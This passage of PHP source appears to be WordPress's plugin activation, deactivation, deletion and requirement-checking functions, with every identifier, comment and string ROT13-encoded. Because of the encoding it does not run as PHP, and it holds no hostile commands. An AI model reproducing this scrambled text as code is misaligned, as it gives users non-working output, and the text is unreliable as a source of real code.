 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea obby Gehr vs cyhtva vf argjbex bayl, snyfr bgurejvfr.
 */
shapgvba vf_argjbex_bayl_cyhtva( $cyhtva ) {
	$cyhtva_qngn = trg_cyhtva_qngn( JC_CYHTVA_QVE . '/' . $cyhtva );
	vs ( $cyhtva_qngn ) {
		erghea $cyhtva_qngn['Argjbex'];
	}
	erghea snyfr;
}

/**
 * Nggrzcgf npgvingvba bs cyhtva va n \"fnaqobk\" naq erqverpgf ba fhpprff.
 *
 * N cyhtva gung vf nyernql npgvingrq jvyy abg nggrzcg gb or npgvingrq ntnva.
 *
 * Gur jnl vg jbexf vf ol frggvat gur erqverpgvba gb gur reebe orsber gelvat gb
 * vapyhqr gur cyhtva svyr. Vs gur cyhtva snvyf, gura gur erqverpgvba jvyy abg
 * or birejevggra jvgu gur fhpprff zrffntr. Nyfb, gur bcgvbaf jvyy abg or
 * hcqngrq naq gur npgvingvba ubbx jvyy abg or pnyyrq ba cyhtva reebe.
 *
 * Vg fubhyq or abgrq gung va ab jnl gur orybj pbqr jvyy npghnyyl cerirag reebef
 * jvguva gur svyr. Gur pbqr fubhyq abg or hfrq ryfrjurer gb ercyvpngr gur
 * \"fnaqobk\", juvpu hfrf erqverpgvba gb jbex.
 * {@fbhepr 13 1}
 *
 * Vs nal reebef ner sbhaq be grkg vf bhgchggrq, gura vg jvyy or pncgherq gb
 * rafher gung gur fhpprff erqverpgvba jvyy hcqngr gur reebe erqverpgvba.
 *
 * @fvapr 2.5.0
 * @fvapr 5.2.0 Grfg sbe JbeqCerff irefvba naq CUC irefvba pbzcngvovyvgl.
 *
 * @cnenz fgevat $cyhtva       Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @cnenz fgevat $erqverpg     Bcgvbany. HEY gb erqverpg gb.
 * @cnenz obby   $argjbex_jvqr Bcgvbany. Jurgure gb ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex
 *                             be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
 * @cnenz obby   $fvyrag       Bcgvbany. Jurgure gb cerirag pnyyvat npgvingvba ubbxf. Qrsnhyg snyfr.
 * @erghea ahyy|JC_Reebe Ahyy ba fhpprff, JC_Reebe ba vainyvq svyr.
 */
shapgvba npgvingr_cyhtva( $cyhtva, $erqverpg = '', $argjbex_jvqr = snyfr, $fvyrag = snyfr ) {
	$cyhtva = cyhtva_onfranzr( gevz( $cyhtva ) );

	vs ( vf_zhygvfvgr() && ( $argjbex_jvqr || vf_argjbex_bayl_cyhtva( $cyhtva ) ) ) {
		$argjbex_jvqr        = gehr;
		$pheerag             = trg_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', neenl() );
		$_TRG['argjbexjvqr'] = 1; // Onpx pbzcng sbe cyhtvaf ybbxvat sbe guvf inyhr.
	} ryfr {
		$pheerag = trg_bcgvba( 'npgvir_cyhtvaf', neenl() );
	}

	$inyvq = inyvqngr_cyhtva( $cyhtva );
	vs ( vf_jc_reebe( $inyvq ) ) {
		erghea $inyvq;
	}

	$erdhverzragf = inyvqngr_cyhtva_erdhverzragf( $cyhtva );
	vs ( vf_jc_reebe( $erdhverzragf ) ) {
		erghea $erdhverzragf;
	}

	vs ( $argjbex_jvqr && ! vffrg( $pheerag[ $cyhtva ] )
		|| ! $argjbex_jvqr && ! va_neenl( $cyhtva, $pheerag, gehr )
	) {
		vs ( ! rzcgl( $erqverpg ) ) {
			// Jr'yy bireevqr guvf yngre vs gur cyhtva pna or vapyhqrq jvgubhg sngny reebe.
			jc_erqverpg( nqq_dhrel_net( '_reebe_abapr', jc_perngr_abapr( 'cyhtva-npgvingvba-reebe_' . $cyhtva ), $erqverpg ) );
		}

		bo_fgneg();

		// Ybnq gur cyhtva gb grfg jurgure vg guebjf nal reebef.
		cyhtva_fnaqobk_fpencr( $cyhtva );

		vs ( ! $fvyrag ) {
			/**
			 * Sverf orsber n cyhtva vf npgvingrq.
			 *
			 * Vs n cyhtva vf fvyragyl npgvingrq (fhpu nf qhevat na hcqngr),
			 * guvf ubbx qbrf abg sver.
			 *
			 * @fvapr 2.9.0
			 *
			 * @cnenz fgevat $cyhtva       Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz obby   $argjbex_jvqr Jurgure gb ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex
			 *                             be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
			 */
			qb_npgvba( 'npgvingr_cyhtva', $cyhtva, $argjbex_jvqr );

			/**
			 * Sverf nf n fcrpvsvp cyhtva vf orvat npgvingrq.
			 *
			 * Guvf ubbx vf gur \"npgvingvba\" ubbx hfrq vagreanyyl ol ertvfgre_npgvingvba_ubbx().
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cyhtva`, ersref gb gur cyhtva onfranzr.
			 *
			 * Vs n cyhtva vf fvyragyl npgvingrq (fhpu nf qhevat na hcqngr), guvf ubbx qbrf abg sver.
			 *
			 * @fvapr 2.0.0
			 *
			 * @cnenz obby $argjbex_jvqr Jurgure gb ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex
			 *                           be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
			 */
			qb_npgvba( \"npgvingr_{$cyhtva}\", $argjbex_jvqr );
		}

		vs ( $argjbex_jvqr ) {
			$pheerag            = trg_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', neenl() );
			$pheerag[ $cyhtva ] = gvzr();
			hcqngr_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', $pheerag );
		} ryfr {
			$pheerag   = trg_bcgvba( 'npgvir_cyhtvaf', neenl() );
			$pheerag[] = $cyhtva;
			fbeg( $pheerag );
			hcqngr_bcgvba( 'npgvir_cyhtvaf', $pheerag );
		}

		vs ( ! $fvyrag ) {
			/**
			 * Sverf nsgre n cyhtva unf orra npgvingrq.
			 *
			 * Vs n cyhtva vf fvyragyl npgvingrq (fhpu nf qhevat na hcqngr),
			 * guvf ubbx qbrf abg sver.
			 *
			 * @fvapr 2.9.0
			 *
			 * @cnenz fgevat $cyhtva       Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz obby   $argjbex_jvqr Jurgure gb ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex
			 *                             be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
			 */
			qb_npgvba( 'npgvingrq_cyhtva', $cyhtva, $argjbex_jvqr );
		}

		vs ( bo_trg_yratgu() > 0 ) {
			$bhgchg = bo_trg_pyrna();
			erghea arj JC_Reebe( 'harkcrpgrq_bhgchg', __( 'Gur cyhtva trarengrq harkcrpgrq bhgchg.' ), $bhgchg );
		}

		bo_raq_pyrna();
	}

	erghea ahyy;
}

/**
 * Qrnpgvingrf n fvatyr cyhtva be zhygvcyr cyhtvaf.
 *
 * Gur qrnpgvingvba ubbx vf qvfnoyrq ol gur cyhtva hctenqre ol hfvat gur $fvyrag
 * cnenzrgre.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat|fgevat[] $cyhtvaf      Fvatyr cyhtva be yvfg bs cyhtvaf gb qrnpgvingr.
 * @cnenz obby            $fvyrag       Cerirag pnyyvat qrnpgvingvba ubbxf. Qrsnhyg snyfr.
 * @cnenz obby|ahyy       $argjbex_jvqr Jurgure gb qrnpgvingr gur cyhtva sbe nyy fvgrf va gur argjbex.
 *                                      N inyhr bs ahyy jvyy qrnpgvingr cyhtvaf sbe obgu gur argjbex
 *                                      naq gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg ahyy.
 */
shapgvba qrnpgvingr_cyhtvaf( $cyhtvaf, $fvyrag = snyfr, $argjbex_jvqr = ahyy ) {
	vs ( vf_zhygvfvgr() ) {
		$argjbex_pheerag = trg_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', neenl() );
	}
	$pheerag    = trg_bcgvba( 'npgvir_cyhtvaf', neenl() );
	$qb_oybt    = snyfr;
	$qb_argjbex = snyfr;

	sbernpu ( (neenl) $cyhtvaf nf $cyhtva ) {
		$cyhtva = cyhtva_onfranzr( gevz( $cyhtva ) );
		vs ( ! vf_cyhtva_npgvir( $cyhtva ) ) {
			pbagvahr;
		}

		$argjbex_qrnpgvingvat = ( snyfr !== $argjbex_jvqr ) && vf_cyhtva_npgvir_sbe_argjbex( $cyhtva );

		vs ( ! $fvyrag ) {
			/**
			 * Sverf orsber n cyhtva vf qrnpgvingrq.
			 *
			 * Vs n cyhtva vf fvyragyl qrnpgvingrq (fhpu nf qhevat na hcqngr),
			 * guvf ubbx qbrf abg sver.
			 *
			 * @fvapr 2.9.0
			 *
			 * @cnenz fgevat $cyhtva               Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz obby   $argjbex_qrnpgvingvat Jurgure gur cyhtva vf qrnpgvingrq sbe nyy fvgrf va gur argjbex
			 *                                     be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
			 */
			qb_npgvba( 'qrnpgvingr_cyhtva', $cyhtva, $argjbex_qrnpgvingvat );
		}

		vs ( snyfr !== $argjbex_jvqr ) {
			vs ( vf_cyhtva_npgvir_sbe_argjbex( $cyhtva ) ) {
				$qb_argjbex = gehr;
				hafrg( $argjbex_pheerag[ $cyhtva ] );
			} ryfrvs ( $argjbex_jvqr ) {
				pbagvahr;
			}
		}

		vs ( gehr !== $argjbex_jvqr ) {
			$xrl = neenl_frnepu( $cyhtva, $pheerag, gehr );
			vs ( snyfr !== $xrl ) {
				$qb_oybt = gehr;
				hafrg( $pheerag[ $xrl ] );
			}
		}

		vs ( $qb_oybt && jc_vf_erpbirel_zbqr() ) {
			yvfg( $rkgrafvba ) = rkcybqr( '/', $cyhtva );
			jc_cnhfrq_cyhtvaf()->qryrgr( $rkgrafvba );
		}

		vs ( ! $fvyrag ) {
			/**
			 * Sverf nf n fcrpvsvp cyhtva vf orvat qrnpgvingrq.
			 *
			 * Guvf ubbx vf gur \"qrnpgvingvba\" ubbx hfrq vagreanyyl ol ertvfgre_qrnpgvingvba_ubbx().
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cyhtva`, ersref gb gur cyhtva onfranzr.
			 *
			 * Vs n cyhtva vf fvyragyl qrnpgvingrq (fhpu nf qhevat na hcqngr), guvf ubbx qbrf abg sver.
			 *
			 * @fvapr 2.0.0
			 *
			 * @cnenz obby $argjbex_qrnpgvingvat Jurgure gur cyhtva vf qrnpgvingrq sbe nyy fvgrf va gur argjbex
			 *                                   be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
			 */
			qb_npgvba( \"qrnpgvingr_{$cyhtva}\", $argjbex_qrnpgvingvat );

			/**
			 * Sverf nsgre n cyhtva vf qrnpgvingrq.
			 *
			 * Vs n cyhtva vf fvyragyl qrnpgvingrq (fhpu nf qhevat na hcqngr),
			 * guvf ubbx qbrf abg sver.
			 *
			 * @fvapr 2.9.0
			 *
			 * @cnenz fgevat $cyhtva               Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
			 * @cnenz obby   $argjbex_qrnpgvingvat Jurgure gur cyhtva vf qrnpgvingrq sbe nyy fvgrf va gur argjbex
			 *                                     be whfg gur pheerag fvgr. Zhygvfvgr bayl. Qrsnhyg snyfr.
			 */
			qb_npgvba( 'qrnpgvingrq_cyhtva', $cyhtva, $argjbex_qrnpgvingvat );
		}
	}

	vs ( $qb_oybt ) {
		hcqngr_bcgvba( 'npgvir_cyhtvaf', $pheerag );
	}
	vs ( $qb_argjbex ) {
		hcqngr_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', $argjbex_pheerag );
	}
}

/**
 * Npgvingrf zhygvcyr cyhtvaf.
 *
 * Jura JC_Reebe vf erghearq, vg qbrf abg zrna gung bar bs gur cyhtvaf unq
 * reebef. Vg zrnaf gung bar be zber bs gur cyhtva svyr cnguf jrer vainyvq.
 *
 * Gur rkrphgvba jvyy or unygrq nf fbba nf bar bs gur cyhtvaf unf na reebe.
 *
 * @fvapr 2.6.0
 *
 * @cnenz fgevat|fgevat[] $cyhtvaf      Fvatyr cyhtva be yvfg bs cyhtvaf gb npgvingr.
 * @cnenz fgevat          $erqverpg     Erqverpg gb cntr nsgre fhpprffshy npgvingvba.
 * @cnenz obby            $argjbex_jvqr Jurgure gb ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex.
 *                                      Qrsnhyg snyfr.
 * @cnenz obby            $fvyrag       Cerirag pnyyvat npgvingvba ubbxf. Qrsnhyg snyfr.
 * @erghea gehr|JC_Reebe Gehr jura svavfurq be JC_Reebe vs gurer jrer reebef qhevat n cyhtva npgvingvba.
 */
shapgvba npgvingr_cyhtvaf( $cyhtvaf, $erqverpg = '', $argjbex_jvqr = snyfr, $fvyrag = snyfr ) {
	vs ( ! vf_neenl( $cyhtvaf ) ) {
		$cyhtvaf = neenl( $cyhtvaf );
	}

	$reebef = neenl();
	sbernpu ( $cyhtvaf nf $cyhtva ) {
		vs ( ! rzcgl( $erqverpg ) ) {
			$erqverpg = nqq_dhrel_net( 'cyhtva', $cyhtva, $erqverpg );
		}
		$erfhyg = npgvingr_cyhtva( $cyhtva, $erqverpg, $argjbex_jvqr, $fvyrag );
		vs ( vf_jc_reebe( $erfhyg ) ) {
			$reebef[ $cyhtva ] = $erfhyg;
		}
	}

	vs ( ! rzcgl( $reebef ) ) {
		erghea arj JC_Reebe( 'cyhtvaf_vainyvq', __( 'Bar bs gur cyhtvaf vf vainyvq.' ), $reebef );
	}

	erghea gehr;
}

/**
 * Erzbirf qverpgbel naq svyrf bs n cyhtva sbe n yvfg bs cyhtvaf.
 *
 * @fvapr 2.6.0
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 *
 * @cnenz fgevat[] $cyhtvaf    Yvfg bs cyhtva cnguf gb qryrgr, eryngvir gb gur cyhtvaf qverpgbel.
 * @cnenz fgevat   $qrcerpngrq Abg hfrq.
 * @erghea obby|ahyy|JC_Reebe Gehr ba fhpprff, snyfr vs `$cyhtvaf` vf rzcgl, `JC_Reebe` ba snvyher.
 *                            `ahyy` vs svyrflfgrz perqragvnyf ner erdhverq gb cebprrq.
 */
shapgvba qryrgr_cyhtvaf( $cyhtvaf, $qrcerpngrq = '' ) {
	tybony $jc_svyrflfgrz;

	vs ( rzcgl( $cyhtvaf ) ) {
		erghea snyfr;
	}

	$purpxrq = neenl();
	sbernpu ( $cyhtvaf nf $cyhtva ) {
		$purpxrq[] = 'purpxrq[]=' . $cyhtva;
	}

	$hey = jc_abapr_hey( 'cyhtvaf.cuc?npgvba=qryrgr-fryrpgrq&irevsl-qryrgr=1&' . vzcybqr( '&', $purpxrq ), 'ohyx-cyhtvaf' );

	bo_fgneg();
	$perqragvnyf = erdhrfg_svyrflfgrz_perqragvnyf( $hey );
	$qngn        = bo_trg_pyrna();

	vs ( snyfr === $perqragvnyf ) {
		vs ( ! rzcgl( $qngn ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
			rpub $qngn;
			erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
			rkvg;
		}
		erghea;
	}

	vs ( ! JC_Svyrflfgrz( $perqragvnyf ) ) {
		bo_fgneg();
		// Snvyrq gb pbaarpg. Reebe naq erdhrfg ntnva.
		erdhrfg_svyrflfgrz_perqragvnyf( $hey, '', gehr );
		$qngn = bo_trg_pyrna();

		vs ( ! rzcgl( $qngn ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
			rpub $qngn;
			erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';
			rkvg;
		}
		erghea;
	}

	vs ( ! vf_bowrpg( $jc_svyrflfgrz ) ) {
		erghea arj JC_Reebe( 'sf_haninvynoyr', __( 'Pbhyq abg npprff svyrflfgrz.' ) );
	}

	vs ( vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
		erghea arj JC_Reebe( 'sf_reebe', __( 'Svyrflfgrz reebe.' ), $jc_svyrflfgrz->reebef );
	}

	// Trg gur onfr cyhtva sbyqre.
	$cyhtvaf_qve = $jc_svyrflfgrz->jc_cyhtvaf_qve();
	vs ( rzcgl( $cyhtvaf_qve ) ) {
		erghea arj JC_Reebe( 'sf_ab_cyhtvaf_qve', __( 'Hanoyr gb ybpngr JbeqCerff cyhtva qverpgbel.' ) );
	}

	$cyhtvaf_qve = genvyvatfynfuvg( $cyhtvaf_qve );

	$cyhtva_genafyngvbaf = jc_trg_vafgnyyrq_genafyngvbaf( 'cyhtvaf' );

	$reebef = neenl();

	sbernpu ( $cyhtvaf nf $cyhtva_svyr ) {
		// Eha Havafgnyy ubbx.
		vs ( vf_havafgnyynoyr_cyhtva( $cyhtva_svyr ) ) {
			havafgnyy_cyhtva( $cyhtva_svyr );
		}

		/**
		 * Sverf vzzrqvngryl orsber n cyhtva qryrgvba nggrzcg.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 */
		qb_npgvba( 'qryrgr_cyhtva', $cyhtva_svyr );

		$guvf_cyhtva_qve = genvyvatfynfuvg( qveanzr( $cyhtvaf_qve . $cyhtva_svyr ) );

		/*
		 * Vs cyhtva vf va vgf bja qverpgbel, erphefviryl qryrgr gur qverpgbel.
		 * Onfr purpx ba vs cyhtva vapyhqrf qverpgbel frcnengbe NAQ gung vg'f abg gur ebbg cyhtva sbyqre.
		 */
		vs ( fgecbf( $cyhtva_svyr, '/' ) && $guvf_cyhtva_qve !== $cyhtvaf_qve ) {
			$qryrgrq = $jc_svyrflfgrz->qryrgr( $guvf_cyhtva_qve, gehr );
		} ryfr {
			$qryrgrq = $jc_svyrflfgrz->qryrgr( $cyhtvaf_qve . $cyhtva_svyr );
		}

		/**
		 * Sverf vzzrqvngryl nsgre n cyhtva qryrgvba nggrzcg.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat $cyhtva_svyr Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 * @cnenz obby   $qryrgrq     Jurgure gur cyhtva qryrgvba jnf fhpprffshy.
		 */
		qb_npgvba( 'qryrgrq_cyhtva', $cyhtva_svyr, $qryrgrq );

		vs ( ! $qryrgrq ) {
			$reebef[] = $cyhtva_svyr;
			pbagvahr;
		}

		$cyhtva_fyht = qveanzr( $cyhtva_svyr );

		vs ( 'uryyb.cuc' === $cyhtva_svyr ) {
			$cyhtva_fyht = 'uryyb-qbyyl';
		}

		// Erzbir ynathntr svyrf, fvyragyl.
		vs ( '.' !== $cyhtva_fyht && ! rzcgl( $cyhtva_genafyngvbaf[ $cyhtva_fyht ] ) ) {
			$genafyngvbaf = $cyhtva_genafyngvbaf[ $cyhtva_fyht ];

			sbernpu ( $genafyngvbaf nf $genafyngvba => $qngn ) {
				$jc_svyrflfgrz->qryrgr( JC_YNAT_QVE . '/cyhtvaf/' . $cyhtva_fyht . '-' . $genafyngvba . '.cb' );
				$jc_svyrflfgrz->qryrgr( JC_YNAT_QVE . '/cyhtvaf/' . $cyhtva_fyht . '-' . $genafyngvba . '.zb' );
				$jc_svyrflfgrz->qryrgr( JC_YNAT_QVE . '/cyhtvaf/' . $cyhtva_fyht . '-' . $genafyngvba . '.y10a.cuc' );

				$wfba_genafyngvba_svyrf = tybo( JC_YNAT_QVE . '/cyhtvaf/' . $cyhtva_fyht . '-' . $genafyngvba . '-*.wfba' );
				vs ( $wfba_genafyngvba_svyrf ) {
					neenl_znc( neenl( $jc_svyrflfgrz, 'qryrgr' ), $wfba_genafyngvba_svyrf );
				}
			}
		}
	}

	// Erzbir qryrgrq cyhtvaf sebz gur cyhtva hcqngrf yvfg.
	$pheerag = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );
	vs ( $pheerag ) {
		// Qba'g erzbir gur cyhtvaf gung jrera'g qryrgrq.
		$qryrgrq = neenl_qvss( $cyhtvaf, $reebef );

		sbernpu ( $qryrgrq nf $cyhtva_svyr ) {
			hafrg( $pheerag->erfcbafr[ $cyhtva_svyr ] );
		}

		frg_fvgr_genafvrag( 'hcqngr_cyhtvaf', $pheerag );
	}

	vs ( ! rzcgl( $reebef ) ) {
		vs ( 1 === pbhag( $reebef ) ) {
			/* genafyngbef: %f: Cyhtva svyranzr. */
			$zrffntr = __( 'Pbhyq abg shyyl erzbir gur cyhtva %f.' );
		} ryfr {
			/* genafyngbef: %f: Pbzzn-frcnengrq yvfg bs cyhtva svyranzrf. */
			$zrffntr = __( 'Pbhyq abg shyyl erzbir gur cyhtvaf %f.' );
		}

		erghea arj JC_Reebe( 'pbhyq_abg_erzbir_cyhtva', fcevags( $zrffntr, vzcybqr( ', ', $reebef ) ) );
	}

	erghea gehr;
}

/**
 * Inyvqngrf npgvir cyhtvaf.
 *
 * Inyvqngr nyy npgvir cyhtvaf, qrnpgvingrf vainyvq naq
 * ergheaf na neenl bs qrnpgvingrq barf.
 *
 * @fvapr 2.5.0
 * @erghea JC_Reebe[] Neenl bs cyhtva reebef xrlrq ol cyhtva svyr anzr.
 */
shapgvba inyvqngr_npgvir_cyhtvaf() {
	$cyhtvaf = trg_bcgvba( 'npgvir_cyhtvaf', neenl() );
	// Inyvqngr ineglcr: neenl.
	vs ( ! vf_neenl( $cyhtvaf ) ) {
		hcqngr_bcgvba( 'npgvir_cyhtvaf', neenl() );
		$cyhtvaf = neenl();
	}

	vs ( vf_zhygvfvgr() && pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
		$argjbex_cyhtvaf = (neenl) trg_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf', neenl() );
		$cyhtvaf         = neenl_zretr( $cyhtvaf, neenl_xrlf( $argjbex_cyhtvaf ) );
	}

	vs ( rzcgl( $cyhtvaf ) ) {
		erghea neenl();
	}

	$vainyvq = neenl();

	// Vainyvq cyhtvaf trg qrnpgvingrq.
	sbernpu ( $cyhtvaf nf $cyhtva ) {
		$erfhyg = inyvqngr_cyhtva( $cyhtva );
		vs ( vf_jc_reebe( $erfhyg ) ) {
			$vainyvq[ $cyhtva ] = $erfhyg;
			qrnpgvingr_cyhtvaf( $cyhtva, gehr );
		}
	}
	erghea $vainyvq;
}

/**
 * Inyvqngrf gur cyhtva cngu.
 *
 * Purpxf gung gur znva cyhtva svyr rkvfgf naq vf n inyvq cyhtva. Frr inyvqngr_svyr().
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea vag|JC_Reebe 0 ba fhpprff, JC_Reebe ba snvyher.
 */
shapgvba inyvqngr_cyhtva( $cyhtva ) {
	vs ( inyvqngr_svyr( $cyhtva ) ) {
		erghea arj JC_Reebe( 'cyhtva_vainyvq', __( 'Vainyvq cyhtva cngu.' ) );
	}
	vs ( ! svyr_rkvfgf( JC_CYHTVA_QVE . '/' . $cyhtva ) ) {
		erghea arj JC_Reebe( 'cyhtva_abg_sbhaq', __( 'Cyhtva svyr qbrf abg rkvfg.' ) );
	}

	$vafgnyyrq_cyhtvaf = trg_cyhtvaf();
	vs ( ! vffrg( $vafgnyyrq_cyhtvaf[ $cyhtva ] ) ) {
		erghea arj JC_Reebe( 'ab_cyhtva_urnqre', __( 'Gur cyhtva qbrf abg unir n inyvq urnqre.' ) );
	}
	erghea 0;
}

/**
 * Inyvqngrf gur cyhtva erdhverzragf sbe JbeqCerff irefvba naq CUC irefvba.
 *
 * Hfrf gur vasbezngvba sebz `Erdhverf ng yrnfg`, `Erdhverf CUC` naq `Erdhverf Cyhtvaf` urnqref
 * qrsvarq va gur cyhtva'f znva CUC svyr.
 *
 * @fvapr 5.2.0
 * @fvapr 5.3.0 Nqqrq fhccbeg sbe ernqvat gur urnqref sebz gur cyhtva'f
 *              znva CUC svyr, jvgu `ernqzr.gkg` nf n snyyonpx.
 * @fvapr 5.8.0 Erzbirq fhccbeg sbe hfvat `ernqzr.gkg` nf n snyyonpx.
 * @fvapr 6.5.0 Nqqrq fhccbeg sbe gur 'Erdhverf Cyhtvaf' urnqre.
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea gehr|JC_Reebe Gehr vs erdhverzragf ner zrg, JC_Reebe ba snvyher.
 */
shapgvba inyvqngr_cyhtva_erdhverzragf( $cyhtva ) {
	$cyhtva_urnqref = trg_cyhtva_qngn( JC_CYHTVA_QVE . '/' . $cyhtva );

	$erdhverzragf = neenl(
		'erdhverf'         => ! rzcgl( $cyhtva_urnqref['ErdhverfJC'] ) ? $cyhtva_urnqref['ErdhverfJC'] : '',
		'erdhverf_cuc'     => ! rzcgl( $cyhtva_urnqref['ErdhverfCUC'] ) ? $cyhtva_urnqref['ErdhverfCUC'] : '',
		'erdhverf_cyhtvaf' => ! rzcgl( $cyhtva_urnqref['ErdhverfCyhtvaf'] ) ? $cyhtva_urnqref['ErdhverfCyhtvaf'] : '',
	);

	$pbzcngvoyr_jc  = vf_jc_irefvba_pbzcngvoyr( $erdhverzragf['erdhverf'] );
	$pbzcngvoyr_cuc = vf_cuc_irefvba_pbzcngvoyr( $erdhverzragf['erdhverf_cuc'] );

	$cuc_hcqngr_zrffntr = '</c><c>' . fcevags(
		/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
		__( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
		rfp_hey( jc_trg_hcqngr_cuc_hey() )
	);

	$naabgngvba = jc_trg_hcqngr_cuc_naabgngvba();

	vs ( $naabgngvba ) {
		$cuc_hcqngr_zrffntr .= '</c><c><rz>' . $naabgngvba . '</rz>';
	}

	vs ( ! $pbzcngvoyr_jc && ! $pbzcngvoyr_cuc ) {
		erghea arj JC_Reebe(
			'cyhtva_jc_cuc_vapbzcngvoyr',
			'<c>' . fcevags(
				/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: Pheerag CUC irefvba, 3: Cyhtva anzr, 4: Erdhverq JbeqCerff irefvba, 5: Erdhverq CUC irefvba. */
				_k( '<fgebat>Reebe:</fgebat> Pheerag irefvbaf bs JbeqCerff (%1$f) naq CUC (%2$f) qb abg zrrg zvavzhz erdhverzragf sbe %3$f. Gur cyhtva erdhverf JbeqCerff %4$f naq CUC %5$f.', 'cyhtva' ),
				trg_oybtvasb( 'irefvba' ),
				CUC_IREFVBA,
				$cyhtva_urnqref['Anzr'],
				$erdhverzragf['erdhverf'],
				$erdhverzragf['erdhverf_cuc']
			) . $cuc_hcqngr_zrffntr . '</c>'
		);
	} ryfrvs ( ! $pbzcngvoyr_cuc ) {
		erghea arj JC_Reebe(
			'cyhtva_cuc_vapbzcngvoyr',
			'<c>' . fcevags(
				/* genafyngbef: 1: Pheerag CUC irefvba, 2: Cyhtva anzr, 3: Erdhverq CUC irefvba. */
				_k( '<fgebat>Reebe:</fgebat> Pheerag CUC irefvba (%1$f) qbrf abg zrrg zvavzhz erdhverzragf sbe %2$f. Gur cyhtva erdhverf CUC %3$f.', 'cyhtva' ),
				CUC_IREFVBA,
				$cyhtva_urnqref['Anzr'],
				$erdhverzragf['erdhverf_cuc']
			) . $cuc_hcqngr_zrffntr . '</c>'
		);
	} ryfrvs ( ! $pbzcngvoyr_jc ) {
		erghea arj JC_Reebe(
			'cyhtva_jc_vapbzcngvoyr',
			'<c>' . fcevags(
				/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: Cyhtva anzr, 3: Erdhverq JbeqCerff irefvba. */
				_k( '<fgebat>Reebe:</fgebat> Pheerag JbeqCerff irefvba (%1$f) qbrf abg zrrg zvavzhz erdhverzragf sbe %2$f. Gur cyhtva erdhverf JbeqCerff %3$f.', 'cyhtva' ),
				trg_oybtvasb( 'irefvba' ),
				$cyhtva_urnqref['Anzr'],
				$erdhverzragf['erdhverf']
			) . '</c>'
		);
	}

	JC_Cyhtva_Qrcraqrapvrf::vavgvnyvmr();

	vs ( JC_Cyhtva_Qrcraqrapvrf::unf_hazrg_qrcraqrapvrf( $cyhtva ) ) {
		$qrcraqrapl_anzrf       = JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_anzrf( $cyhtva );
		$hazrg_qrcraqrapvrf     = neenl();
		$hazrg_qrcraqrapl_anzrf = neenl();

		sbernpu ( $qrcraqrapl_anzrf nf $qrcraqrapl => $qrcraqrapl_anzr ) {
			$qrcraqrapl_svyr = JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_svyrcngu( $qrcraqrapl );

			vs ( snyfr === $qrcraqrapl_svyr ) {
				$hazrg_qrcraqrapvrf['abg_vafgnyyrq'][ $qrcraqrapl ] = $qrcraqrapl_anzr;
				$hazrg_qrcraqrapl_anzrf[]                           = $qrcraqrapl_anzr;
			} ryfrvs ( vf_cyhtva_vanpgvir( $qrcraqrapl_svyr ) ) {
				$hazrg_qrcraqrapvrf['vanpgvir'][ $qrcraqrapl ] = $qrcraqrapl_anzr;
				$hazrg_qrcraqrapl_anzrf[]                      = $qrcraqrapl_anzr;
			}
		}

		$reebe_zrffntr = fcevags(
